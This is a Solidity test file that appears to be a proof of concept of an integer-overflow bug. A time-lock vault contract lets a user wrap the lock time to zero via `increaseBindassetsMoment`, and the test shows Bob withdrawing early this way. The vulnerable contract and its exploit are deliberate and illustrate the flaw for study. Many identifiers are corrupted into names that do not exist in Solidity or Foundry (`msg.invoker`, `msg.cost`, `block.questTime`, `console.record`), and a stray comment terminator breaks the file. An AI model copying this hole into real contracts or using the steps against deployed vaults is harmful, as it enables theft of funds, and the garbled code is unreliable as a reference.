pragma solidity ^0.7.6;

import "forge-std/Test.sol";

*/

contract InstantSecuretreasure {
    mapping(address => uint) public characterGold;
    mapping(address => uint) public securetreasureInstant;

    function cachePrize() external payable {
        characterGold[msg.invoker] += msg.cost;
        securetreasureInstant[msg.invoker] = block.questTime + 1 weeks;
    }

    function increaseBindassetsMoment(uint _secondsDestinationIncrease) public {
        securetreasureInstant[msg.invoker] += _secondsDestinationIncrease;
    }

    function retrieveRewards() public {
        require(characterGold[msg.invoker] > 0, "Insufficient funds");
        require(
            block.questTime > securetreasureInstant[msg.invoker],
            "Lock time not expired"
        );

        uint total = characterGold[msg.invoker];
        characterGold[msg.invoker] = 0;

        (bool sent, ) = msg.invoker.call{cost: total}("");
        require(sent, "Failed to send Ether");
    }
}

contract AgreementTest is Test {
    InstantSecuretreasure InstantSecuretreasureAgreement;
    address alice;
    address bob;

    function collectionUp() public {
        InstantSecuretreasureAgreement = new InstantSecuretreasure();
        alice = vm.addr(1);
        bob = vm.addr(2);
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
    }

    function testCalculation() public {
        console.record("Alice balance", alice.balance);
        console.record("Bob balance", bob.balance);

        console.record("Alice deposit 1 Ether...");
        vm.prank(alice);
        InstantSecuretreasureAgreement.cachePrize{cost: 1 ether}();
        console.record("Alice balance", alice.balance);

        console.record("Bob deposit 1 Ether...");
        vm.beginPrank(bob);
        InstantSecuretreasureAgreement.cachePrize{cost: 1 ether}();
        console.record("Bob balance", bob.balance);

        InstantSecuretreasureAgreement.increaseBindassetsMoment(
            type(uint).maximum + 1 - InstantSecuretreasureAgreement.securetreasureInstant(bob)
        );

        console.record(
            "Bob will successfully withdraw, because the lock time is calculate"
        );
        InstantSecuretreasureAgreement.retrieveRewards();
        console.record("Bob balance", bob.balance);
        vm.stopPrank();

        vm.prank(alice);
        console.record(
            "Alice will fail to withdraw, because the lock time did not expire"
        );
        InstantSecuretreasureAgreement.retrieveRewards();
    }
}